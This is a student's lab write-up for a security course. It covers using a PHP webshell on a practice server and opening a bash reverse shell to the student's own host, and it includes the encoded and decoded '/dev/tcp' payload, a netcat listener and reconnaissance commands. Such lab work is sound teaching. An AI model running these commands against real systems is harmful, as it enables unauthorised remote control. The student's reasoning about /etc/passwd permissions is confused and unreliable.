Author: Mauricio I. Reyes Villanueva \
Due: October 30, 2024

## Part I:
a. In order to execute to execute this code you would simply go to the url of the site and modify it as follows: "http://danger.jeffondich.com/uploadedimages/reyesm-webshell.php?command=CMD"

**Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?**
Where "CMD" is a relevant command such as "ls" or in this case "whoami"

**b. What is this webshell's \<pre\> tag for? (And more to the point, what happens if you leave it out?)** \
The pretag is short for preformatted text, and aims to preserve whitespace, line breaks, and so on. It's usually used whenever code snippets are put into an html document. If the pretags are taken out, the code will still function as normal because PHP is parsed in a manner such that it does not depend on a certain manner of whitespace, or line breaks. It can be collapsed down to a singular line and still function properly, but as a result the output that it generates will be displayed as html with no pretag which will result in the output being unformattted and lack line breaks since html requires line breaks to be done through html tags or codes.

## Part II:
a. What directory is danger's website located in? \
The working directory is as follows: /var/www/danger.jeffondich.com/uploadedimages

**b. What are the names of all the user accounts on danger.jeffondich.com? How do you know?** \
The names of all the user accounts
- bullwinkle
- jeff
they can be found via the command: ls /home

**c. Do you have access to the file /etc/passwd? What's in it?** \
No you do not have access to /etc/passwd. That said, we can view what's inside it, which begins as follows:

root:x:0:0:root:/root:/bin/bash \
daemon...

That said, there is far more to the file. To view the file you can run the cmd: cat /etc/*passwd

Which simply says cat any file that ends with passwd

For some reason this file is not displayable if you try "cat /etc/passwd" though since that seems to be "protected"?

**d. Do you have access to the file /etc/shadow? What's in it? (You'll have to look onliine for the answer to that second question, since the answer to the first is no.)** \
No you do not have access to /etc/shadow. Additionally, unlike /etc/passwd which has read permissions for a non root user, shadow does not, so you would need to sudo in order to view the contents of the shadow file.

e. There may be some secret files scattered around. See how many you can find and report on your discoveries. \
There are several files scattered all throughout which can be recursively viewed with the following command ```ls -laR``` in directories such as ```~``` and ```/etc```

Using this we can find the following file

/var/www/danger.jeffondich.com/secrets/kindasecret.txt

and we can cat it. To display the following:

    Congratulations!
            _   _
           (.)_(.)
        _ (   _   ) _
       / \/`-----'\/ \
     __\ ( (     ) ) /__
     )   /\ \._./ /\   (
      )_/ /|\   /|\ \_(

by Joan Stark, https://www.asciiart.eu/animals/frogs

## Part IV:

**a. What is the IP address of your Kali VM (the target machine)? How did you find out?** \
The ipaddress of the kali virtual machine is 192.168.64.2 which I found out by using "ip a".

**b. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?** \
The ipaddresses of my host (attacking) machine include 10.133.16.98 for en0 and 192.168.64.1 for bridge100, which is the one I should use to communicate with Kali because it is the one directly connected to my host machine on the same network.

**c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT** \
I ran the following: 
```
nc -l 8000
```

**d.In a browser on your host machine, use your web shell to go to this crazy URL.** \
I ran the following: 
```
http://192.168.64.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/8000%200%3E%261%22
```

**e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?** \

Yes I do have a shell now, and it allows me to execute commands. I can tell its kali, based on the files I can view via ```ls``` but more importantly via the ipaddress that shows up when running ```ifconfig``` which resolves to kali's ipaddress.

**f. What are all those % codes in the URL you used?** \
Those codes are special character alternatives that are used for the url, because certain characters are reserved for url parsing, so they need to be encoded for a proper transmission and interpretation. In this case the decoded version of this url is as follows:
```
http://192.168.64.2/webshell.php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/8000 0>&1"
```

**g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.**

```
         ┌─┐                                                                                                    ┌─┐       
         ║"│                                                                                                    ║"│       
         └┬┘                                                                                                    └┬┘       
         ┌┼┐                                                                                                    ┌┼┐       
          │                                                           ┌──────┐                                   │        
         ┌┴┐                                                          │Server│                                  ┌┴┐       
      Attacker                                                        └───┬──┘                                Target      
          │                                                               │   Opens up a server to the world     │        
          │                                                               │<─────────────────────────────────────│        
          │                                                               │                                      │        
          │    Writes and uploads a php script that allows the            │                                      │        
          │     attacker to run their own php commands on the server      │                                      │        
          │──────────────────────────────────────────────────────────────>│                                      │        
          │                                                               │                                      │        
          │────┐                                                          │                                      │        
          │    │ Opens up a listening port to accept incoming connections │                                      │        
          │<───┘                                                          │                                      │        
          │                                                               │                                      │        
          │Inputs: http://Target_IP/webshell.php?command=                 │                                      │        
          │ bash -c "bash -i >& /dev/tcp/Attacker_IP/Attacker_Port 0>&1"  │                                      │        
          │──────────────────────────────────────────────────────────────>│                                      │        
          │                                                               │                                      │        
          │ ╔═════════════════════════════════════════════════════════════╗                                      │        
          │ ║Note: You will need to replace sensitive/special url chars  ░║                                      │        
          │ ║ with their appropriate codes                                ║                                      │        
          │ ╚═════════════════════════════════════════════════════════════╝                                      │        
          │                                                               │Executes the command on the server    │        
          │                                                               │ host's machine (i.e. target machine) │        
          │                                                               │─────────────────────────────────────>│        
          │                                                               │                                      │        
          │                                                               │ ╔════════════════════════════════════╧═══════╗
          │                                                               │ ║This command in specific runs the          ░║
          │                                                               │ ║ following bash cmd 'bash -i >&             ║
          │                                                               │ ║ /dev/tcp/Attacker_IP/Attacker_Port 0>&1'   ║
          │                                                               │ ║ which then establishes a reverse shell     ║
          │                                                               │ ║ connection back to the attacker's          ║
          │                                                               │ ║ machine, allowing the attacker to exec     ║
          │                                                               │ ║ commands via their nc instance             ║
          │                                                               │ ╚════════════════════════════════════╤═══════╝
          │                                    netcat connection is created                                      │        
          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
          │                                                               │                                      │        
          │ ╔═════════════════════════════════════════════════╗           │                                      │        
          │ ║Various types of attacks can now possibly occur ░║           │                                      │        
          │ ╚═════════════════════════════════════════════════╝           │                                      │        
          │                                               whoami          │                                      │        
          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
          │                                                               │                                      │        
          │                                              www-data         │                                      │        
          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
          │                                                               │                                      │        
          │                                                 pwd           │                                      │        
          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
          │                                                               │                                      │        
          │                                            /var/www/html      │                                      │        
          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
          │                                                               │                                      │        
          │                                                 ls            │                                      │        
          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
          │                                                               │                                      │        
          │                          index.html  index.nginx-debian.html  webshell.php                           │        
          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
          │                                                               │                                      │        
          │                                                 ...           │                                      │        
          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
          │                                                               │                                      │        
          │                                                 ...           │                                      │        
          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
      Attacker                                                        ┌───┴──┐                                Target      
         ┌─┐                                                          │Server│                                  ┌─┐       
         ║"│                                                          └──────┘                                  ║"│       
         └┬┘                                                                                                    └┬┘       
         ┌┼┐                                                                                                    ┌┼┐       
          │                                                                                                      │        
         ┌┴┐                                                                                                    ┌┴┐       
```
